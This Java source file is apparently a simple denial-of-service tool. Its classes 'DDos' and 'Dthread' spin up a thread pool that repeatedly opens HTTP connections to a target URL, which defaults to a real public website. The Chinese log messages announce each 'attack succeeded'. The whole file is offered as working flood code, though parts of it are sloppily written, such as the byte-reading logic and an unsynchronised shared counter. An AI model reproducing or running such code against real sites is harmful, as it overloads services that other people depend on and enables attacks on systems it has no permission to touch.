package net.itanken.ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import net.itanken.ddos.utils.StrUtils;

public class DDos {

	public DDos() {}
	public static int count = 0; // 总次数
	public static void main(String[] args) throws InterruptedException {
		new DDos().doDDos(5, 2);
	}
	
	private ExecutorService es = null;
	/**
	 * @param tCount 线程数
	 * @param sCount 单线程请求数
	 * @throws InterruptedException
	 */
	public boolean doDDos(int tCount, int sCount) throws InterruptedException {
		es = Executors.newFixedThreadPool(tCount);

		Dthread dThread = new Dthread("", sCount);
		Thread thread = new Thread(dThread);
		for (int i = 0; i < tCount; i++) {
			es.execute(thread);
		}
		es.shutdown();
		while(true) {
			if(es.isTerminated()) {
				DDosFrame.jtaInfo.append("执行完毕！" + count);
				return true;
			}
			Thread.sleep(2000);
		}
	}
	
	public boolean stopDDos() {
		if(es != null) {
			es.shutdownNow();
			return true;
		}
		return false;
	}
}

class Dthread implements Runnable {
	private static String urlStr = "https://www.baidu.com/";
	private static int count = 1000;

	/**
	 * @param url 请求地址
	 * @param sCount 单线程请求数
	 */
	public Dthread(String url, int sCount) {
		if (!StrUtils.isEmpty(url)) {
			urlStr = url;
		}
		count = sCount;
	}

	public void run() {
		while (count == 0 || DDos.count < count) {
			try {
				DDos.count++;
				int curCount = DDos.count;
				URL url = new URL(urlStr);
				URLConnection conn = url.openConnection();
				DDosFrame.jtaInfo.append(" 第 " + curCount + " 次发包成功。");
				BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
				byte[] bytes = new byte[1024];
				int len = -1;
				StringBuffer sb = new StringBuffer();
				if (bis != null && (len = bis.read()) != -1) {
					sb.append(new String(bytes, 0, len));
					DDosFrame.jtaInfo.append(" 第 " + curCount + " 次攻击成功！");
					bis.close();
				}
			} catch (MalformedURLException e) {
				DDosFrame.console.showError(e);
			} catch (IOException e) {
				DDosFrame.console.showError(e);
				if (e.getMessage().contains("Server returned HTTP response code")) {
					DDosFrame.jtaInfo.append("请检查网站！");
				}
			}
		}
	}
}